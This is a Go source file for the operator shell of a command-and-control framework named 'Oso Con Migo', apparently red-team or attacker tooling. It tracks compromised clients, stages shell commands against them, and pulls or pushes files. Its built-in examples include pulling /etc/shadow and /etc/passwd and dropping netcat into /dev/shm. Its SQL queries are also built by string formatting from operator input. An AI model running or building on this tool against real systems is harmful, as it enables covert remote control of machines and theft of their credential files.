package main

import (
	"database/sql"
	b64 "encoding/base64"
	"flag"
	"fmt"
	"github.com/c-bata/go-prompt"
	"github.com/common-nighthawk/go-figure"
	"github.com/jedib0t/go-pretty/table"
	_ "github.com/lib/pq"
	"gopkg.in/yaml.v2"
	"log"
	"os"
	"strconv"
	"strings"
	"time"
)

// Human readable date format
const human string = "2006-01-02 15:04:05"

// Database connection
var db *sql.DB

// Configuration file
var cfg Config

// Configuration file struct
type Config struct {
	Database struct {
		Dbhost string 	`yaml:"host"`
		Dbport int	`yaml:"port"`
		Dbuser string 	`yaml:"user"`
		Dbpass string 	`yaml:"pass"`
		Dbname string 	`yaml:"name"`
		Dbmode string 	`yaml:"mode"`
	} `yaml:"database"`
	Server struct {
		In 	string 	`yaml:"in"`
	} `yaml:"server"`
}

// Active client holder
var active = ""

var LivePrefixState struct {
	livePrefix string
	isEnable   bool
}

// Client task object
type ClientIdentity struct {
	Id 		int 	`db:"id"`
	Node 		string 	`db:"node"`
	Arch 	string 	`db:"arch"`
	Os 		string 	`db:"os"`
	Secret          string  `db:"secret"`
	Comms	        string  `db:"comms"`
	Flex          	string 	`db:"flex"`
	FirstSeen 	int64 	`db:"firstSeen"`
	LastSeen 	int64 	`db:"lastSeen"`
}

// Client task object
type ClientTask struct {
	Id 		int 	`db:"id"`
	Node 		string 	`db:"node"`
	Command 	string 	`db:"command"`
	Job             int     `db:"job"`
	Status 		string 	`db:"status"`
	TaskDate 	int64 	`db:"taskDate"`
	CompleteDate 	int64 	`db:"completeDate"`
	Complete 	bool 	`db:"complete"`
}

// Default task object
type DefaultTask struct {
	Id 		int 	`db:"id"`
	Node 		string 	`db:"node"`
	Command 	string 	`db:"command"`
	Status 		string 	`db:"status"`
}

// Client struct for posting results
type Result struct {
	Node   	string `json:"node"`
	JobId  	int    `json:"jobId"`
	Output 	string `json:"output"`
}

func main() {

	// Required: server and database configuration file
	var config = flag.String("c", "config.yml", "Configuration file")
	flag.Parse()

	initShell(*config)

	myFigure := figure.NewFigure("Oso Con Migo", "block", true)
	myFigure.Print()
	fmt.Println("v2.1")

	fmt.Println("\n[+] Starting shell...")
	fmt.Println("")

	p := prompt.New(
		executor,
		completer,
		prompt.OptionPrefix("Grizzly -> "),
		prompt.OptionLivePrefix(changeLivePrefix),
		prompt.OptionTitle("OsoConMigo"),
	)
	p.Run()
}

// Error function
func processError(err error) {
	fmt.Println(err)
	os.Exit(2)
}

// Initialize the shell, read variables from yaml and connect to db
func initShell(c string) {
	// Read server configuration
	f, err := os.Open(c)
	if err != nil {
		fmt.Println("[!] Missing configuration file.")
		os.Exit(3)
	}
	defer f.Close()

	decoder := yaml.NewDecoder(f)
	err = decoder.Decode(&cfg)
	if err != nil {
		fmt.Println("[!] Error reading configuration file.")
		os.Exit(3)
	}

	// Connect to database
	connect()
}

func getEpochTime() int64 {
	return time.Now().Unix()
}

func changeLivePrefix() (string, bool) {
	return LivePrefixState.livePrefix, LivePrefixState.isEnable
}

func checkLiveAndActive() bool {
	if LivePrefixState.isEnable && active != "" {
		return true
	} else {
		return false
	}
}

func taskClientWithJob(c string) ClientTask {
	task := ClientTask{
		Node:         active,
		Command:      c,
		Status:       "Staged",
		TaskDate:     getEpochTime(),
		CompleteDate: 0,
		Complete:     false,
	}
	return task
}

func taskDefaultJob(a string) DefaultTask {
	task := DefaultTask{
		Node:		"default",
		Command:	a,
		Status:		"cooking",
	}
	return task
}

func executor(in string) {
	c := strings.Split(in, " ")

	if len(c) < 1 {
		fmt.Println("[!] Missing command")
		return
	}

	cmd := strings.TrimSpace(c[0])

	switch cmd {
	case "staged":
		if checkLiveAndActive() && len(c) == 1 {
			ShowStagedJobs(active)
		} else {
			fmt.Println("[!] Invalid command. Must be tagged into an client. Takes 0 arguments.")
		}
	case "default":
		if len(c) == 1 {
			LivePrefixState.livePrefix = strings.TrimSpace(c[0]) + " -> "
			LivePrefixState.isEnable = true
			active = c[0]
		} else {
			fmt.Println("[!] Invalid command. Default takes 0 arguments.")
		}
	case "cook":
		if active == "default" {
			if strings.TrimSpace(c[1]) == "task" {
				if strings.TrimSpace(c[1]) == "task" && len(c) > 3 {
					task := taskDefaultJob(strings.Join(c[2:], " "))
					AddDefaultTask(task)
				} else {
					fmt.Println("[!] Invalid command. Takes shell and shell command.")
					fmt.Println("Example: cook task /bin/bash ifconfig")
				}
			} else if (strings.TrimSpace(c[1]) == "set" && len(c) == 4) {
				if (strings.TrimSpace(c[2]) == "comms" || strings.TrimSpace(c[2]) == "flex") {
					x, err := strconv.Atoi(c[3])
					if err != nil {
						fmt.Println("[!] Invalid Interval")
						return
					}
					task := taskDefaultJob(strings.Join(c[1:], " "))
					AddDefaultTask(task)
					if strings.TrimSpace(c[2]) == "comms" {
						DefaultComms(x)
					} else if strings.TrimSpace(c[2]) == "flex" {
						DefaultFlex(x)
					}
				}
			} else if strings.TrimSpace(c[1]) == "pull" && len(c) == 3 {
				task := taskDefaultJob(strings.Join(c[1:], " "))
				AddDefaultTask(task)
			} else if strings.TrimSpace(c[1]) == "push" && len(c) == 4 {
				f := checkFile(c[2])
				if !f {
					fmt.Println("[!] Could not find file to push")
					return
				}
				task := taskDefaultJob(strings.Join(c[1:], " "))
				AddDefaultTask(task)
			} else {
				fmt.Println("[!] Invalid command for cook.")
				fmt.Println("Example commands for cook are below:")
				fmt.Println("cook task /bin/sh ifconfig")
				fmt.Println("cook set comms 4 || cook set flex 1")
				fmt.Println("cook pull /etc/shadow")
				fmt.Println("cook push /tmp/file /home/user/file")
			}
		}else {
			fmt.Println("[!] Invalid command. The command cook can only be used with the default tag")
		}
	case "trash":
		if len(c) == 1 {
			throwAway()
		} else {
			fmt.Println("[!] Invalid command. The command trash takes 0 arguments.")
		}
	case "serve":
		if len(c) == 1 {
			serveCooked()
		} else {
			fmt.Println("[!] Invalid command. The command serve takes 0 arguments.")
		}
	case "eat":
		if len(c) == 1 {
			eatCooked()
		} else {
			fmt.Println("[!] Invalid command. The command eat takes 0 arguments.")
		}
	case "client":
		if len(c) == 1 {
			LivePrefixState.isEnable = false
			LivePrefixState.livePrefix = in
			active = ""

			ShowClients()
		} else if len(c) == 2 {
			e := CheckClientExists(strings.TrimSpace(c[1]))
			if e {
				LivePrefixState.livePrefix = strings.TrimSpace(c[1]) + " -> "
				LivePrefixState.isEnable = true
				active = c[1]
			} else {
				fmt.Println("[!] Client not found")
			}
		} else {
			fmt.Println("[!] Invalid command. ")
		}
	case "clients":
		if len(c) == 1 {
			ShowClients()
		} else {
			fmt.Println("[!] Invalid command. Takes 0 arguments.")
		}
	case "kill":
		if checkLiveAndActive() && len(c) == 1 {
			task := taskClientWithJob(strings.TrimSpace(c[0]))
			AddClientTask(task)
		} else {
			fmt.Println("[!] Invalid command. Must be tagged into an client. Takes 0 arguments.")
		}
	case "task":
		if checkLiveAndActive() && len(c) > 2 {
			task := taskClientWithJob(strings.Join(c[1:], " "))
			AddClientTask(task)
		} else {
			fmt.Println("[!] Invalid command. Must be tagged into an client. Takes shell + shell command")
			fmt.Println("Example: task /bin/bash ls -la || task /bin/sh ps -efH")
		}
	case "info":
		if checkLiveAndActive() && len(c) == 1 {
			ShowClientInfo(active)
		} else {
			fmt.Println("[!] Invalid command. Must be tagged into an client. Takes 0 arguments.")
		}
	case "jobs":
		if checkLiveAndActive() && len(c) == 1 {
			ShowClientJobs(active)
		} else {
			fmt.Println("[!] Invalid command. Must be tagged into an client. Takes 0 arguments.")
		}
	case "job":
		if checkLiveAndActive() && len(c) == 2 {
			x, err := strconv.Atoi(c[1])
			if err != nil {
				fmt.Println("[!] Invalid job id")
				return
			}
			e := CheckJobExists(x, active)
			if e {
				ShowJobResult(x, active)
			} else {
				fmt.Println("[!] Job not found for client")
			}
		} else {
			fmt.Println("[!] Invalid command. Must be tagged into an client. Takes job + id")
			fmt.Println("Example: job 2 || job 10")
		}
	case "forget":
		if !checkLiveAndActive() && len(c) == 3 && strings.TrimSpace(c[1]) == "client" {
			e := CheckClientExists(strings.TrimSpace(c[2]))
			b := strings.TrimSpace(c[2])
			if e {
				forgetClient1(b)
				forgetClient2(b)
				forgetClient3(b)
				forgetClient4(b)
			} else {
				fmt.Println("[!] Client not found")
			}
		} else {
			fmt.Println("[!] Invalid command. Must not be tagged into an client. Takes client keyword + client node")
			fmt.Println("Example: forget client A10000 || forget client A10002")
		}
	case "set":
		if checkLiveAndActive() && len(c) == 3 && (strings.TrimSpace(c[1]) == "comms" || strings.TrimSpace(c[1]) == "flex") {
			x, err := strconv.Atoi(c[2])
			if err != nil {
				fmt.Println("[!] Invalid interval")
				return
			}
			task := taskClientWithJob(strings.Join(c[:], " "))
			AddClientTask(task)

			if strings.TrimSpace(c[1]) == "comms" {
				SetComms(active, x)
			} else {
				SetFlex(active, x)
			}
		} else {
			fmt.Println("[!] Invalid command. Must not be tagged into an client. Takes type keyword + interval in (s)")
			fmt.Println("Example: set comms 300 || set flex 60")
		}
	case "flush":
		if checkLiveAndActive() && len(c) == 1 {
			FlushJobs(active)
		} else {
			fmt.Println("[!] Invalid command. Must be tagged into an client. Takes 0 arguments.")
		}
	case "revoke":
		if checkLiveAndActive() && len(c) == 1 {
			RevokeJobs(active)
		} else if len(c) == 2 && strings.TrimSpace(c[1]) == "restage"{
			RevokeRestageJobs(active)
		} else {
			fmt.Println("[!] Invalid command. Must be tagged into an client. Takes 0 arguments or keyword restage.")
			fmt.Println("Example: revoke || revoke restage")
		}
	case "basket":
		if len(c) == 1 {
			viewCooking()
		} else {
			fmt.Println("[!] Invalid command. The command basket takes 0 arguments.")
		}
	case "served":
		if len(c) == 1 {
			viewServed()
		} else {
			fmt.Println("[!] Invalid command. The command served takes 0 arguments.")
		}
	case "deploy":
		if checkLiveAndActive() && len(c) == 1 {
			DeployClientJobs(active)
		} else {
			fmt.Println("[!] Invalid command. Must be tagged into an client. Takes 0 arguments.")
		}
	case "pull":
		if checkLiveAndActive() && len(c) == 2 {
			task := taskClientWithJob(strings.Join(c[:], " "))
			AddClientTask(task)
		} else {
			fmt.Println("[!] Invalid command. Must be tagged into an client. Takes remote file to pull.")
			fmt.Println("Example: pull /etc/passwd || pull /etc/shadow")
		}
	case "push":
		if checkLiveAndActive() && len(c) == 3 {
			f := checkFile(c[1])
			if !f {
				fmt.Println("[!] Could not find file to push!")
				return
			}
			task := taskClientWithJob(strings.Join(c[:], " "))
			AddClientTask(task)
		} else {
			fmt.Println("[!] Invalid command. Must be tagged into an client. Takes local file + remote file.")
			fmt.Println("Example: push /tmp/nc /dev/shm/nc || push /tmp/wget /dev/shm/wget")
		}
	case "dump":
		if checkLiveAndActive() && len(c) == 1 {
			working := getWorkingDirectory()
			makeDirectories(working, active)
			DumpClient(working, active)
		} else {
			fmt.Println("[!] Invalid command. Must be tagged into a client. dump takes 0 arguments.")
		}
	case "clear":
		if len(c) == 1 {
			cleanUp()
		} else{
			fmt.Println("[!] Invalid command. The clear command takes 0 arguments.")
		}
	case "quit":
		fmt.Println("[->] Goodbye and thank you for bearing with me")
		os.Exit(2)
	}
}

func completer(d prompt.Document) []prompt.Suggest {
	s := []prompt.Suggest{
		{Text: "client", Description: "Tag into an client"},
		{Text: "clients", Description: "List available clients"},
		{Text: "default", Description: "Tag into default to create default commands for initial checkin or reboot"},
		{Text: "job", Description: "Show output from an client job"},
		{Text: "jobs", Description: "Show jobs for an client"},
		{Text: "info", Description: "Show client info"},
		{Text: "task", Description: "Task an client"},
		{Text: "forget job", Description: "Remove a job from tasked jobs"},
		{Text: "forget client", Description: "Remove an client"},
		{Text: "deploy", Description: "Deploy tasks to client"},
		{Text: "flush", Description: "Flush non-deployed tasks"},
		{Text: "revoke", Description: "Revoke a deployed task"},
		{Text: "revoke restage", Description: "Revoke a deployed task and restage for adding additonal commands"},
		{Text: "set comms", Description: "Set the comms interval"},
		{Text: "set flex", Description: "Set the flex interval"},
		{Text: "staged", Description: "Display staged tasks for an client"},
		{Text: "cook", Description: "Set commands, comms, or flex for default tasking"},
		{Text: "trash", Description: "Remove non cooked default taskings"},
		{Text: "eat", Description: "Remove cooked default taskings"},
		{Text: "serve", Description: "Serve cooking default taskings for pickup by nodes on initial check in or reboot"},
		{Text: "basket", Description: "View default task which are cooking net yet served"},
		{Text: "served", Description: "View default tasks which are served ready for pickup"},
		{Text: "kill", Description: "Terminate the client process"},
		{Text: "clear", Description: "Clear all data from tasks, clients, results, defaults and tokens"},
		{Text: "dump", Description: "Dump current client jobs and results to file"},
		{Text: "quit", Description: "Exit the shell"},
	}
	return prompt.FilterHasPrefix(s, d.GetWordBeforeCursor(), true)
}

func b64Decode(s string) string {
	x,_ := b64.StdEncoding.DecodeString(s)
	return string(x)
}

func b64Encode(s string) string {
	return b64.StdEncoding.EncodeToString([]byte(s))
}

func checkFile(s string) bool {
	if _, err := os.Stat(s); os.IsNotExist(err) {
		return false
	} else {
		return true
	}
}

func getWorkingDirectory() string {
        path, err := os.Getwd()
        if err != nil {
                processError(err)
        }
        return path
}

func CreateDirIfNotExist(dir string) {
        if _, err := os.Stat(dir); os.IsNotExist(err) {
                err := os.MkdirAll(dir, 0755)
                if err != nil {
                        processError(err)
                }
        }
}

func makeDirectories(path string, c string) {
        outPath := fmt.Sprintf("%s/%s/%s", path, cfg.Server.In, c)
        CreateDirIfNotExist(outPath)
}

// Connect to postgres database
func connect() {
	connectionString := fmt.Sprintf("host=%s port=%d user=%s password=%s dbname=%s sslmode=%s",
		cfg.Database.Dbhost, cfg.Database.Dbport, cfg.Database.Dbuser, cfg.Database.Dbpass, cfg.Database.Dbname,
		cfg.Database.Dbmode)

	var err error
	db, err = sql.Open("postgres", connectionString)
	if err != nil {
		processError(err)
	}

	err = db.Ping()
	if err != nil {
		processError(err)
	}
}

// Exec Postgres database command
func exec(command string) {
	_, err := db.Exec(command)
	if err != nil {
		log.Fatal(err)
	}
}

// Add task to Postgres
func AddClientTask(a ClientTask) {
	t := "INSERT INTO tasks (node, command, status, taskDate, completeDate, complete) VALUES ('%s', '%s', '%s', %d, %d, %t);"
	command := fmt.Sprintf(t, a.Node, a.Command, a.Status, a.TaskDate, a.CompleteDate, a.Complete)
	exec(command)
}

// Add default task to Postgres
func AddDefaultTask(c DefaultTask) {
	d := "INSERT INTO defaults (node,command,status) VALUES ('%s', '%s', '%s');"
	command := fmt.Sprintf(d, c.Node, c.Command, c.Status)
	exec(command)
}

// Show available clients
func ShowClients() {
	t := "SELECT * FROM clients ORDER BY lastSeen DESC;"
	command := fmt.Sprintf(t)
	rows, err := db.Query(command)
	if err != nil {
		log.Fatal(err)
	}
	defer rows.Close()

	x := table.NewWriter()
	x.SetOutputMirror(os.Stdout)
	x.AppendHeader(table.Row{"Id", "Client", "Arch", "OS", "Secret", "Comms", "Flex", "First Seen", "Last Seen"})

	for rows.Next() {
		var a ClientIdentity
		err = rows.Scan(&a.Id, &a.Node, &a.Arch, &a.Os, &a.Secret, &a.Comms, &a.Flex, &a.FirstSeen, &a.LastSeen)

		if err != nil {
			log.Fatal(err)
		}
		x.AppendRow([]interface{}{a.Id, a.Node, a.Arch, a.Os, a.Secret, a.Comms, a.Flex,
			convertFromEpoch(a.FirstSeen), convertFromEpoch(a.LastSeen)})
	}
	x.Render()
}

func convertFromEpoch(i int64) string {
	t := time.Unix(i, 0)
	return t.Format(human)
}

// Show available clients
func ShowClientInfo(n string) {
	t := "SELECT id,node,arch,os,secret,comms,flex,firstSeen,lastSeen FROM clients WHERE node='%s' LIMIT 1;"
	command := fmt.Sprintf(t, n)
	rows, err := db.Query(command)
	if err != nil {
		log.Fatal(err)
	}
	defer rows.Close()

	for rows.Next() {
		var a ClientIdentity
		err = rows.Scan(&a.Id, &a.Node, &a.Arch, &a.Os, &a.Secret, &a.Comms, &a.Flex, &a.FirstSeen, &a.LastSeen)

		if err != nil {
			log.Fatal(err)
		}
		x := table.NewWriter()
		x.SetOutputMirror(os.Stdout)
		x.AppendHeader(table.Row{"Id", "Client", "Arch", "OS", "Secret", "Comms", "Flex", "First Seen", "Last Seen"})
		x.AppendRow([]interface{}{a.Id, a.Node, a.Arch, a.Os, a.Secret, a.Comms, a.Flex,
			convertFromEpoch(a.FirstSeen), convertFromEpoch(a.LastSeen)})
		x.Render()
	}
}

// Show available clients
func ShowClientJobs(n string) {
	t := "SELECT job, node, command, status, taskDate, completeDate, complete FROM tasks WHERE node='%s' AND (status='Deployed' OR status='Complete') ORDER BY job DESC LIMIT 10;"
	fmt.Println(n)
	command := fmt.Sprintf(t, n)
	rows, err := db.Query(command)
	if err != nil {
		log.Fatal(err)
	}
	defer rows.Close()

	x := table.NewWriter()
	x.SetOutputMirror(os.Stdout)
	x.AppendHeader(table.Row{"Id", "Client", "Command", "Status", "Task Date", "Complete Date", "Complete"})
	for rows.Next() {
		var a ClientTask
		err = rows.Scan(&a.Job, &a.Node, &a.Command, &a.Status, &a.TaskDate, &a.CompleteDate, &a.Complete)

		if err != nil {
			log.Fatal(err)
		}

		x.AppendRow([]interface{}{a.Job, a.Node, a.Command, a.Status, convertFromEpoch(a.TaskDate),
			convertFromEpoch(a.CompleteDate), a.Complete})
	}
	x.Render()
}

// Show Non-Served default jobs
func viewCooking() {
        c := "SELECT node,command,status FROM defaults WHERE status='cooking' AND command !='';"
        command := fmt.Sprintf(c)
	rows, err := db.Query(command)
	if err != nil {
		log.Fatal(err)
	}
	defer rows.Close()

	x := table.NewWriter()
	x.SetOutputMirror(os.Stdout)
	x.AppendHeader(table.Row{"Node", "Command", "Status"})
	for rows.Next() {
		var d DefaultTask
		err = rows.Scan(&d.Node, &d.Command, &d.Status)

		if err != nil {
			log.Fatal(err)
		}

		x.AppendRow([]interface{}{d.Node, d.Command, d.Status})
	}
	x.Render()
}

// Show Served default jobs
func viewServed() {
        c := "SELECT node,command,status FROM defaults WHERE status='cooked' AND command !='';"
        command := fmt.Sprintf(c)
        rows, err := db.Query(command)
        if err != nil {
                log.Fatal(err)
        }
        defer rows.Close()

        x := table.NewWriter()
        x.SetOutputMirror(os.Stdout)
        x.AppendHeader(table.Row{"Node", "Command", "Status"})
        for rows.Next() {
                var d DefaultTask
                err = rows.Scan(&d.Node, &d.Command, &d.Status)

                if err != nil {
                        log.Fatal(err)
                }

                x.AppendRow([]interface{}{d.Node, d.Command, d.Status})
        }
        x.Render()
}


func ShowJobResult(j int, n string) {
	q := "SELECT output FROM results WHERE node='%s' AND jobId=%d"
	command := fmt.Sprintf(q, n, j)
	row := db.QueryRow(command)

	var r Result
	switch err := row.Scan(&r.Output); err  {
	case sql.ErrNoRows:
		fmt.Println("[ERROR] Job results not found")
	case nil:
		fmt.Println("[+] Job Results:\n", b64Decode(strings.TrimSpace(r.Output)))
	default:
		fmt.Println("[ERROR] Job results not found")
	}

}

func CheckClientExists(n string) bool {
	q := "SELECT exists (SELECT 1 from clients WHERE node='%s' LIMIT 1)"
	command := fmt.Sprintf(q, n)
	row := db.QueryRow(command)

	var exists bool
	err := row.Scan(&exists)
	if err != nil {
		return false
	} else {
		return exists
	}
}

func CheckJobExists(i int, n string) bool {
	q := "SELECT exists (SELECT 1 from tasks WHERE node='%s' AND job=%d LIMIT 1)"
	command := fmt.Sprintf(q, n, i)
	row := db.QueryRow(command)

	var exists bool
	err := row.Scan(&exists)
	if err != nil {
		return false
	} else {
		return exists
	}
}

func cleanUp() {
	t := "DELETE FROM tasks;"
	c := "DELETE FROM clients;"
	r := "DELETE FROM results;"
	d := "DELETE FROM defaults;"
	to := "DELETE FROM tokens;"
	exec(t)
	exec(c)
	exec(r)
	exec(d)
	exec(to)
}

func RemoveJob(i int, n string) {
	q := "DELETE FROM tasks WHERE node='%s' AND job=%d LIMIT 1"
	command := fmt.Sprintf(q, n, i)
	exec(command)
}

func forgetClient1(n string) {
	q := "DELETE FROM tasks,clients,tokens,results WHERE node='%s'"
	command := fmt.Sprintf(q, n)
	exec(command)
}

func forgetClient2(n string) {
        q := "DELETE FROM clients WHERE node='%s'"
        command := fmt.Sprintf(q, n)
        exec(command)
}

func forgetClient3(n string) {
        q := "DELETE FROM tokens WHERE node='%s'"
        command := fmt.Sprintf(q, n)
        exec(command)
}

func forgetClient4(n string) {
        q := "DELETE FROM results WHERE node='%s'"
        command := fmt.Sprintf(q, n)
        exec(command)
}

// Show available clients
func ShowStagedJobs(n string) {
	t := "SELECT node, job, command, status, taskDate, completeDate, complete FROM tasks WHERE node='%s' AND status='Staged' ORDER BY taskDate DESC LIMIT 10;"
	command := fmt.Sprintf(t, n)
	rows, err := db.Query(command)
	if err != nil {
		log.Fatal(err)
	}
	defer rows.Close()

	x := table.NewWriter()
	x.SetOutputMirror(os.Stdout)
	x.AppendHeader(table.Row{"Id", "Client", "Command", "Status", "Task Date", "Complete Date", "Complete"})
	for rows.Next() {
		var a ClientTask
		err = rows.Scan(&a.Node, &a.Job, &a.Command, &a.Status, &a.TaskDate, &a.CompleteDate, &a.Complete)

		if err != nil {
			log.Fatal(err)
		}

		x.AppendRow([]interface{}{a.Job, a.Node, a.Command, a.Status, convertFromEpoch(a.TaskDate),
			convertFromEpoch(a.CompleteDate), a.Complete})
	}
	x.Render()
}

func SetComms(n string, i int) {
	u := "UPDATE clients SET comms = %d WHERE node = '%s'"
	c := fmt.Sprintf(u, i, n)
	exec(c)
}

func DefaultComms(i int) {
	t := "INSERT INTO defaults (node,status,comms) VALUES ('%s', '%s', %d);"
	c := fmt.Sprintf(t, "default", "cooking", i)
	exec(c)
}

func SetFlex(n string, i int) {
	u := "UPDATE clients SET flex = %d WHERE node = '%s'"
	c := fmt.Sprintf(u, i, n)
	exec(c)
}

func DefaultFlex(i int) {
	f := "INSERT INTO defaults (node,status,flex) VALUES ('%s', '%s', %d);"
	c := fmt.Sprintf(f, "default", "cooking", i)
	exec(c)
}

func RevokeJobs(n string) {
	u := "DELETE FROM tasks WHERE node='%s' AND status='Deployed'"
	c := fmt.Sprintf(u, n)
	exec(c)
}

func eatCooked() {
	u := "DELETE FROM defaults WHERE status='cooked'"
	c := fmt.Sprintf(u)
	exec(c)
}

func RevokeRestageJobs(n string) {
	u := "UPDATE tasks SET status = 'Staged' WHERE node='%s' AND status='Deployed'"
	c := fmt.Sprintf(u, n)
	exec(c)
}

func DeployClientJobs(n string) {
	u := "UPDATE tasks SET status = 'Deployed' WHERE node='%s' AND status='Staged'"
	c := fmt.Sprintf(u, n)
	exec(c)
}

func serveCooked() {
	u := "UPDATE defaults set status = 'cooked' WHERE status='cooking'"
	c := fmt.Sprintf(u)
	exec(c)
}

func FlushJobs(n string) {
	u := "DELETE FROM tasks WHERE node='%s' AND status='Staged'"
	c := fmt.Sprintf(u, n)
	exec(c)
}

func throwAway() {
	u := "DELETE FROM defaults WHERE status = 'cooking'"
	c := fmt.Sprintf(u)
	exec(c)
}

func DumpClient(d string, n string) {
	i := getEpochTime()
	t := strconv.FormatInt(i, 10)
	m := fmt.Sprintf("/tmp/%s_%s.txt", n, t)
	f := fmt.Sprintf("%s/%s/%s/%s_%s.txt", d, cfg.Server.In, n, n, t)
	w, err := os.OpenFile(m, os.O_CREATE|os.O_WRONLY,0666)
	if err != nil {
		processError(err)
	}
	defer w.Close()
	erro := os.Chown(m, 123, 129)
	if erro != nil {
		processError(erro)
	}
	q := "COPY (SELECT tasks.id,tasks.node,tasks.command,results.output FROM tasks LEFT JOIN results ON tasks .id = results.jobId WHERE tasks.node='%s') TO '%s' DELIMITER ':'"
	c := fmt.Sprintf(q, n, m)
	exec(c)
	er := os.Chown(m, os.Getuid(), os.Getgid())
	if er != nil {
		processError(er)
	}
	mv := os.Rename(m, f)
	if mv != nil {
		processError(mv)
	}
}
